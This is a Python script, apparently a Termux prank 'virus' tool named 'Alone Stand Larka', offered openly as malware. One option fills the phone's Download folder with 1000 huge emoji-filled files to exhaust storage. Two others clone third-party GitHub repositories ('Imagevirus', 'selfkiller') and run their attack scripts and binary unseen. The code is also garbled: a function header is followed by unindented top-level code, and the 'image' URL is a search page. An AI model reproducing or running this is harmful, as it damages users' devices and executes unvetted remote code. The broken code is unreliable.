import os
import subprocess

def create_files():
    import os
import time
import requests
from pyfiglet import figlet_format
from colorama import init, Fore, Style

init(autoreset=True)

print(Fore.BLUE + figlet_format("Alone Stand Larka", font="slant"))

for i in range(3, 0, -1):
    print(Fore.RED + str(i) + " seconds remaining...")
    time.sleep(1)

print(Fore.BLUE + "Options:")
print(Fore.BLUE + "1. Agree")
print(Fore.BLUE + "2. Back")

option = input(Fore.RED + "Enter your choice: ")

if option == "1":
    folder_name = "Virus"
    os.makedirs(os.path.join("/sdcard/Download", folder_name), exist_ok=True)

    image_url = "https://www.google.com/search?q=hacker+image.png&oq=hacker+image.png&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIICAEQABgWGB4yCAgCEAAYFhgeMggIAxAAGBYYHjIICAQQABgWGB4yDQgFEAAYhgMYgAQYigUyDQgGEAAYhgMYgAQYigUyCggHEAAYgAQYogQyCggIEAAYgAQYogQyCggJEAAYgAQYogTSAQg3ODA0ajBqNKgCAbACAQ&client=ms-android-vivo-terr1-rso2&sourceid=chrome-mobile&ie=UTF-8"
    image_response = requests.get(image_url, stream=True)
    image_path = os.path.join("/sdcard/Download", folder_name, "image.png")
    with open(image_path, "wb") as f:
        for chunk in image_response.iter_content(1024):
            f.write(chunk)

    danger_folder_path = os.path.join("/sdcard/Download", folder_name, "Danger")
    os.makedirs(danger_folder_path, exist_ok=True)

    for i in range(1000):
        with open(os.path.join(danger_folder_path, f"file_{i}.txt"), "w") as f:
            f.write("😊" * 10000000)

    print(Fore.BLUE + "Virus Generate Succesfullt")
else:
    print(Fore.RED + "You chose to go back.")


def run_imagevirus():
    subprocess.run(["git", "clone", "https://github.com/AloneStandLarkaAnas/Imagevirus.git"])
    os.chdir("Imagevirus")
    subprocess.run(["python", "attack.py"])

def run_selfkiller():
    subprocess.run(["git", "clone", "https://github.com/GH05T-HUNTER5/selfkiller.git"])
    os.chdir("selfkiller")
    subprocess.run(["chmod", "+x", "selfkiller"])
    subprocess.run(["python3", "install.py"])
    subprocess.run(["python3", "install.py"])
    subprocess.run(["./selfkiller"])

def main():
    print("Select an option:")
    print("1. Create files")
    print("2. Run Imagevirus")
    print("3. Run Selfkiller")
    option = input("Enter your choice: ")
    if option == "1":
        create_files()
    elif option == "2":
        run_imagevirus()
    elif option == "3":
        run_selfkiller()
    else:
        print("Invalid option")

if __name__ == "__main__":
    main( )
